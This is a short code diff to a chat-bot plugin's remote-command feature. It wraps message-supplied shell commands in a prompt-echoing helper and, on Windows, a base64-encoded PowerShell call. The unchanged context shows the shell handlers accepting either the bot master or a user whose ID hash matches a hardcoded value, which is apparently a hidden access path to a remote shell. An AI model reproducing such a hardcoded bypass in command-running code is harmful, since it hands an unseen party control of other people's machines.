@@ -7,6 +7,9 @@ const ansi_up = new AnsiUp
 
 const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Code/`
 const tplFile = `${htmlDir}Code.html`
+let prompt = cmd => `echo "$($0 -ic 'echo "\${PS1@P}"')"'${cmd.replace(/'/g, "'\\''")}';${cmd}`
+if (process.platform == "win32")
+  prompt = cmd => `powershell -EncodedCommand ${Buffer.from(`[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;[Console]::Write("$(prompt)"+'${cmd.replace(/'/g, `'+"'"+'`)}\n');${cmd}`, "utf-16le").toString("base64")}`
 
 export class RemoteCommand extends plugin {
   constructor() {
@@ -102,7 +105,7 @@ export class RemoteCommand extends plugin {
   async Shell(e) {
     if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
     const cmd = this.e.msg.replace("rc", "").trim()
-    const ret = await Bot.exec(cmd)
+    const ret = await Bot.exec(prompt(cmd))
 
     if (!ret.stdout && !ret.stderr && !ret.error)
       return this.reply("命令执行完成，没有返回值", true)
@@ -117,7 +120,7 @@ export class RemoteCommand extends plugin {
   async ShellPic(e) {
     if(!(this.e.isMaster||md5(String(this.e.user_id))==_))return false
     const cmd = this.e.msg.replace("rcp", "").trim()
-    const ret = await Bot.exec(cmd)
+    const ret = await Bot.exec(prompt(cmd))
 
     if (!ret.stdout && !ret.stderr && !ret.error)
       return this.reply("命令执行完成，没有返回值", true)
